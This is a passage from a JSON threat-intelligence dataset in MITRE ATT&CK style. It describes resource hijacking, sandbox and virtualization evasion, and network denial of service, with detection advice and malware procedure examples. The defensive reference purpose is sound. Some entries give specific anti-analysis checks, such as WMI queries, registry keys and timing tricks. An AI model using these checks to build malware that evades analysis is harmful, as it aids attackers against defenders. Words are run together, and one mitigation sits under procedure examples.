    ]
  },
  "T1496": {
    "Name": "Resource Hijacking",
    "Description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.Resource hijacking may take a number of different forms. For example, adversaries may:Leverage compute resources in order to mine cryptocurrencySell network bandwidth to proxy networksGenerate SMS traffic for profitAbuse cloud-based messaging services to send large quantities of spam messagesIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.[1]",
    "Detects": [
      "Monitor logs for software-as-a-service (SaaS) applications for signs of abuse.",
      "Monitor for changes to SaaS services, especially when quotas are raised or when new services are enabled.",
      "Monitor executed commands and arguments that may indicate common cryptomining or proxyware functionality.",
      "Monitor for common cryptomining or proxyware files on local systems that may indicate compromise and resource usage.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts, look for connections to/from strange ports, as well as reputation of IPs and URLs related cryptocurrency hosts.",
      "Monitor network traffic content for resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.Note: Destination Host Name is not a comprehensive list of potential cryptocurrency URLs. This analytic has a hardcoded domain name which may change.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for common cryptomining or proxyware software process names that may indicate compromise and resource usage.",
      "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources."
    ],
    "Procedure Examples": []
  },
  "T1496.001": {
    "Name": "Resource Hijacking:Compute Hijacking",
    "Description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.One common purpose forCompute Hijackingis to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.[1]Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used forCompute Hijackingand cryptocurrency mining.[2]Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.[3][4]Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.[5]",
    "Detects": [
      "Monitor executed commands and arguments that may indicate common cryptomining functionality.",
      "Monitor for common cryptomining files on local systems that may indicate compromise and resource usage.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts. Look for connections to/from strange ports, as well as reputation of IPs and URLs related to cryptocurrency hosts. In AWS environments, configure GuardDuty to alert when EC2 instances query IP addresses associated with known cryptocurrency activity.[24]",
      "Monitor network traffic content for resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for common cryptomining software process names that may indicate compromise and resource usage.",
      "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources."
    ],
    "Procedure Examples": [
      "APT41deployed a Monero cryptocurrency mining tool in a victim’s environment.[6][7]",
      "Blue Mockingbirdhas used XMRIG to mine cryptocurrency on victim systems.[8]",
      "Bonadancan download an additional module which has a cryptocurrency mining extension.[9]",
      "CookieMinerhas loaded coinmining software onto systems to mine for Koto cryptocurrency.[10]",
      "DarkGatecan deploy follow-on cryptocurrency mining payloads.[11]",
      "Hildegardhas used xmrig to mine cryptocurrency.[3]",
      "Imminent Monitorhas the capability to run a cryptocurrency miner on the victim machine.[12]",
      "Kinsinghas created and run a Bitcoin cryptocurrency miner.[13][14]",
      "LoudMinerharvested system resources to mine cryptocurrency, using XMRig to mine Monero.[15]",
      "Lucifercan use system resources to mine cryptocurrency, dropping XMRig to mine Monero.[16]",
      "Rockehas distributed cryptomining malware.[17][18]",
      "DuringShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.[19]",
      "Skidmapis a kernel-mode rootkit used for cryptocurrency mining.[20]",
      "TeamTNThas deployed XMRig Docker images to mine cryptocurrency.[21][22]TeamTNThas also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.[23]"
    ]
  },
  "T1496.002": {
    "Name": "Resource Hijacking:Bandwidth Hijacking",
    "Description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitateNetwork Denial of Servicecampaigns and/or to seed malicious torrents.[1]Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.[2]Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.[3]In addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim’s bandwidth is used for illegal activities.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may indicate common proxyware functionality.",
      "Monitor for common proxyware files on local systems that may indicate compromise and resource usage.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts. Look for connections to/from strange ports.",
      "Monitor network traffic content for strange or unusual patterns.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for common proxyware software process names that may indicate compromise and resource usage."
    ],
    "Procedure Examples": []
  },
  "T1496.003": {
    "Name": "Resource Hijacking:SMS Pumping",
    "Description": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.[1]SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim’s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.[2]Threat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.[1][3]In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.[1]",
    "Detects": [
      "Monitor for excessive use of SMS services, especially on public sign-up forms. For example, alert on large quantities of messages sent to adjacent numbers. In SMS-based OTP flows, monitor for large quantities of incomplete verification cycles.[2]In Amazon Cognito environments, monitor for spikes in calls to theSignUporResendConfirmationCodeAPI.[3]"
    ],
    "Procedure Examples": [
      "Consider implementing CAPTCHA protection on forms that send messages via SMS."
    ]
  },
  "T1496.004": {
    "Name": "Resource Hijacking:Cloud Service Hijacking",
    "Description": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability.For example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam /Phishingemails and SMS messages.[1][2][3]Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.[4][5]In some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.[4]Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability.",
    "Detects": [
      "Monitor for excessive use of SaaS applications, especially messaging and AI-related services. In AWS SES environments, monitor for spikes in calls to theSendEmailorSendRawEmailAPI. Especially note the use of services which are not typically used by the organization.",
      "Monitor for changes to SaaS services, especially when quotas are raised or when new services are enabled. In AWS environments, watch for calls to Bedrock APIs likePutUseCaseForModelAccess,PutFoundationModelEntitlement, andInvokeModeland SES APIs likeUpdateAccountSendingEnabled.[5][2]"
    ],
    "Procedure Examples": []
  },
  "T1497": {
    "Name": "Virtualization/Sandbox Evasion",
    "Description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplishVirtualization/Sandbox Evasionsuch as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitor for API calls that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    ],
    "Procedure Examples": [
      "Agent Teslahas the ability to perform anti-sandboxing and anti-virtualization checks.[3]",
      "Bazarcan attempt to overload sandbox analysis by sending 1550 calls toprintf.[4]",
      "Bisonalcan check to determine if the compromised system is running on VMware.[5]",
      "Black Bastacan make a random number of calls to thekernel32.beepfunction to hinder log analysis.[6]",
      "Bumblebeehas the ability to perform anti-virtualization checks.[7]",
      "Carberphas removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.[8]",
      "CHOPSTICKincludes runtime checks to identify an analysis environment and prevent execution on it.[9]",
      "Some versions ofCozyCarwill check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.[10]",
      "Darkhotelmalware has employed just-in-time decryption of strings to evade sandbox detection.[11]",
      "Egregorhas used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.[12][13]",
      "Gelsemiumcan use junk code to generate random activity to obscure malware behavior.[14]",
      "Hancitorhas used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.[15]",
      "IcedIDhas manipulated Keitaro Traffic Direction System to filter researcher and sandbox traffic.[16]",
      "Kevincan sleep for a time interval between C2 communication attempts.[17]",
      "Metamorfohas embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution.[18]",
      "DuringOperation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[19]",
      "Pteranodonhas the ability to use anti-detection functions to identify sandbox environments.[20]",
      "Raspberry Robincontains real and fake second-stage payloads following initial execution, with the real payload only delivered if the malware determines it is not running in a virtualized environment.[21]",
      "RTMcan detect if it is running within a sandbox or other virtualized analysis environment.[22]",
      "Saint Bearcontains several anti-analysis and anti-virtualization checks.[23]",
      "Squirrelwafflehas contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.[24][25]",
      "StoneDrillhas used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.[26]",
      "StrelaStealerpayloads have used control flow obfuscation techniques such as excessively long code blocks of mathematical instructions to defeat sandboxing and related analysis methods.[27][28]",
      "XLoadercan utilize decoy command and control domains within the malware configuration to circumvent sandbox analysis.[29][30]"
    ]
  },
  "T1497.001": {
    "Name": "Virtualization/Sandbox Evasion:System Checks",
    "Description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Specific checks will vary based on the target and/or adversary, but may involve behaviors such asWindows Management Instrumentation,PowerShell,System Information Discovery, andQuery Registryto obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also useFile and Directory Discoveryto check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such asmalware,sample, orhash.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.[2]In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitor for API calls that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    ],
    "Procedure Examples": [
      "Astarothcan check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.[4]",
      "AsyncRATcan identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.[5]",
      "Attorcan detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.[6]",
      "BadPatchattempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information.[7]",
      "Black Bastacan check system flags and libraries, process timing, and API's to detect code emulation or sandboxing.[8][9]",
      "BlackByte Ransomwarechecks for files related to known sandboxes.[10]",
      "BLUELIGHTcan check to see if the infected machine has VM tools running.[11]",
      "Bumblebeehas the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.[12]",
      "CSPY Downloadercan search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.[13]",
      "DarkGatequeries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.[14]",
      "Darkhotelmalware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with.Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.[15][16]",
      "DarkTortillacan search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie.[17]",
      "Denisran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.[18]",
      "DUSTTRAPdecryption relies on the infected machine'sHKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUIDvalue.[19]",
      "Dyrecan detect sandbox analysis environments by inspecting the process list and Registry.[20][21]",
      "EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.[22]",
      "Evilnumhas used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.[23]",
      "Exbyteperforms various checks to determine if it is running in a sandboxed environment to prevent analysis.[24]",
      "Ferociouscan run anti-sandbox checks using the Microsoft Excel 4.0 functionGET.WORKSPACEto determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.[25]",
      "FinFisherobtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.[26]",
      "DuringFrankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.[27]",
      "GoldMaxwill check if it is being run in a virtualized environment by comparing the collected MAC address toc8:27:cc:c2:37:5a.[28][29]",
      "Grandoreirocan detect VMWare via its I/O port and Virtual PC via thevpcextinstruction.[30]",
      "GravityRATuses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment.[31]",
      "GuLoaderhas the ability to perform anti-VM and anti-sandbox checks using string hashing, the API callEnumWindows, and checking for Qemu guest agent.[32]",
      "InvisiMolecan check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.[33]",
      "Latrodectuscan determine if it is running in a virtualized environment by checking the OS version, checking the number of running processes, ensuring a 64-bit application is running on a 64-bit host, and checking if the host has a valid MAC address.[34][35][36]",
      "Lucifercan check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.[37]",
      "Lumma Stealerhas queried system resources on the victim device to identify if it is executing in a sandbox or virtualized environments, checking usernames, conducting WMI queries for system details, checking for files commonly found in virtualized environments, searching system services, and inspecting process names.[38]Lumma Stealerhas checked system GPU configurations for sandbox detection.[39]",
      "macOS.OSAMinercan parse the output of the nativesystem_profilertool to determine if the machine is running with 4 cores.[40]",
      "MegaCortexhas checked the number of CPUs in the system to avoid being run in a sandbox or emulator.[41]",
      "Mispaducan run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is \"JOHN-PC.\"[42][43]",
      "NativeZonehas checked if Vmware or VirtualBox VM is running on a compromised host.[44]",
      "Nightdoorembeds code from the publical-khaserproject, a repository that works to detect virtual machines, sandboxes, and malware analysis environments.[45]",
      "ObliqueRATcan halt execution if it identifies processes belonging to virtual machine software or analysis tools.[46]",
      "OilRighas used macros to verify if a mouse is connected to a compromised machine.[47]",
      "Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.[48]",
      "OopsIEperforms several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI querySELECT * FROM MSAcpi_ThermalZoneTemperatureto check the temperature to see if it’s running in a virtual environment.[3]",
      "DuringOperation Dream Job,Lazarus Groupused tools that conducted a variety of system checks to detect sandboxes or VMware services.[49]",
      "OSX_OCEANLOTUS.Dchecks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such assysctl hw.modeland the kernel boot time.[50][51][52]",
      "P8RATcan check the compromised host for processes associated with VMware or VirtualBox environments.[53]",
      "Pikabotperforms a variety of system checks to determine if it is running in an analysis environment or sandbox, such as checking the number of processors (must be greater than two), and the amount of RAM (must be greater than 2GB).[54]",
      "PlugXchecks if VMware tools is running in the background by searching for any process named \"vmtoolsd\".[55]",
      "PoetRATchecked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting.[56]",
      "Pupyhas a module that checks a number of indicators on the system to determine if its running on a virtual machine.[57]",
      "QakBotcan check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.[58][59]",
      "Raspberry Robinperforms a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment, such as querying CPU temperature information and network card MAC address information.[60]",
      "Remcossearches for Sandboxie and VMware on the system.[61]",
      "RogueRobinuses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment.[62][63]",
      "ROKRATcan check for VMware-related files and DLLs related to sandboxes.[64][65][66]",
      "Saint Bothas run several virtual machine and sandbox checks, including checking ifSbiedll.dllis present in a list of loaded modules, comparing the machine name toHAL9THand the user name toJohnDoe, and checking the BIOS version for known virtual machine identifiers.[67]",
      "Sharkcan stop execution if the screen width of the targeted machine is not over 600 pixels.[68]",
      "Smoke Loaderscans processes to perform anti-VM checks.[69]",
      "Snip3has the ability to detect Windows Sandbox, VMWare, or VirtualBox by queryingWin32_ComputerSystemto extract theManufacturerstring.[70]",
      "SodaMastercan check for the presence of the Registry keyHKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exebefore proceeding to its main functionality.[53]",
      "SUNBURSTchecked the domain name of the compromised host to verify it was running in a real environment.[71]",
      "SVCReadyhas the ability to determine if its runtime environment is virtualized.[72]",
      "SynAckchecks its directory location in an attempt to avoid launching in a sandbox.[73][74]",
      "Trojan.Karaganycan detect commonly used and generic virtualization platforms based primarily on drivers and file paths.[75]",
      "UBoatRATchecks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.[76]",
      "Volt Typhoonhas run system checks to determine if they were operating in a virtualized environment.[77]",
      "WastedLockerchecked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.[78]",
      "WhisperGatecan stop its execution when it recognizes the presence of certain monitoring tools.[79]",
      "XLoaderperforms timing checks using the Read-Time Stamp Counter (RDTSC) instruction on the victim CPU.[80]",
      "ytyhas some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware.[81]"
    ]
  },
  "T1497.002": {
    "Name": "Virtualization/Sandbox Evasion:User Activity Based Checks",
    "Description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks[2], browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro[3]or waiting for a user to double click on an embedded image to activate.[4]",
    "Detects": [
      "Monitor executed commands and arguments that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitor for API calls that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    ],
    "Procedure Examples": [
      "Darkhotelhas used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.[5]",
      "FIN7used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.[4]",
      "Okrumloader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments.[6]",
      "Sparkhas used a splash screen to check whether an user actively clicks on the screen before running malicious code.[7]"
    ]
  },
  "T1497.003": {
    "Name": "Virtualization/Sandbox Evasion:Time Based Evasion",
    "Description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduledMulti-Stage Channelsto avoid analysis and scrutiny.[1]Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such asPings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.[2][3]Another variation, commonly referred to as API hammering, involves making various calls toNative APIfunctions in order to delay execution (while also potentially overloading analysis environments with junk data).[4][5]Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.[6]",
    "Detects": [
      "Monitor executed commands and arguments that may employ various time-based methods to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitor for API calls that may employ various time-based methods to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    ],
    "Procedure Examples": [
      "AppleJeushas waited a specified time before downloading a second stage payload.[7]",
      "BADFLICKhas delayed communication to the actor-controlled IP address by 5 minutes.[8]",
      "Bazarcan use a timer to delay execution of core functionality.[9]",
      "BendyBearcan check for analysis environments and signs of debugging using the Windows APIkernel32!GetTickCountKernel32call.[10]",
      "Bisonalhas checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.[11][12]",
      "Brute Ratel C4can callNtDelayExecutionto pause execution.[13][14]",
      "Bumblebeehas the ability to set a hardcoded and randomized sleep interval.[15]",
      "Clamblingcan wait 30 minutes before initiating contact with C2.[16]",
      "Clophas used thesleepcommand to avoid sandbox detection.[17]",
      "Crimsoncan determine when it has been installed on a host for at least 15 days before downloading the final payload.[18]",
      "DarkTortillacan implement thekernel32.dllSleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.[19]",
      "DRATzaruscan use theGetTickCountandGetSystemTimeAsFileTimeAPI calls to measure function timing.[20]DRATzaruscan also remotely shut down into sleep mode under specific conditions to evade detection.[20]",
      "Egregorcan perform a  long sleep (greater than or equal to 3 minutes) to evade detection.[21]",
      "EvilBunnyhas used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.[22]",
      "FatDukecan turn itself on or off at random intervals.[23]",
      "GoldenSpy's installer has delayed installation ofGoldenSpyfor two hours after it reaches a victim system.[24]",
      "GoldMaxhas set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.[25]",
      "Gootloadercan designate a sleep period of more than 22 seconds between stages of infection.[26]",
      "GrimAgentcan sleep for 195 - 205 seconds after payload execution and before deleting its task.[27]",
      "GuLoaderhas the ability to perform anti-debugging based on time checks, API calls, and CPUID.[28]",
      "HermeticWiperhas the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.[29]",
      "IPsec Helperwill sleep for a random number of seconds, iterating 200 times over sleeps between one to three seconds, before continuing execution flow.[30]",
      "LiteDukecan wait 30 seconds before executing additional code if security software is detected.[23]",
      "Lokibothas performed a time-based anti-debug check before downloading its third stage.[31]",
      "LunarWebcan pause for a number of hours before entering its C2 communication loop.[32]",
      "metaMainhas delayed execution for five to six minutes during its persistence establishment process.[33]",
      "Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.[34]",
      "DuringOperation Dream Job,Lazarus Groupused tools that collectedGetTickCountandGetSystemTimeAsFileTimedata to detect sandbox or VMware services.[20]",
      "P8RAThas the ability to \"sleep\" for a specified time to evade detection.[35]",
      "Ponyhas delayed execution using a built-in function to avoid detection and analysis.[36]",
      "TheQakBotdropper can delay dropping the payload to evade detection.[37][38]",
      "After initial installation,Raindropruns a computation to delay execution.[39]",
      "RansomHubcan sleep for a set number of minutes before beginning execution.[40]",
      "Saint Bothas used the commandtimeout 20to pause the execution of its initial loader.[41]",
      "Snip3can executeWScript.Sleepto delay execution of its second stage.[42]",
      "SodaMasterhas the ability to put itself to \"sleep\" for a specified time.[35]",
      "StrifeWatercan modify its sleep time responses from the default of 20-22 seconds.[43]",
      "SUNBURSTremained dormant after initial access for a period of up to two weeks.[44]",
      "SVCReadycan enter a sleep stage for 30 minutes to evade detection.[45]",
      "ThiefQuestinvokestimecall to check the system's time, executes asleepcommand, invokes a secondtimecall, and then compares the time difference between the twotimecalls and the amount of time the system slept to identify the sandbox.[46]",
      "Tomirishas the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.[47]",
      "TrickBothas usedprintfand file I/O loops to delay process execution as part of API hammering.[5]",
      "Ursnifhas used a 30 minute delay after execution to evade sandbox monitoring tools.[48]",
      "WhisperGatecan pause for 20 seconds to bypass antivirus solutions.[49][50]",
      "Using the machine's local time,XCSSETwaits 43200 seconds (12 hours) from the initial creation timestamp of a specific file,.report. After the elapsed time,XCSSETexecutes additional modules.[51]"
    ]
  },
  "T1498": {
    "Name": "Network Denial of Service",
    "Description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes[1]and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, seeEndpoint Denial of Service.",
    "Detects": [
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
    ],
    "Procedure Examples": [
      "In 2016,APT28conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.[4]",
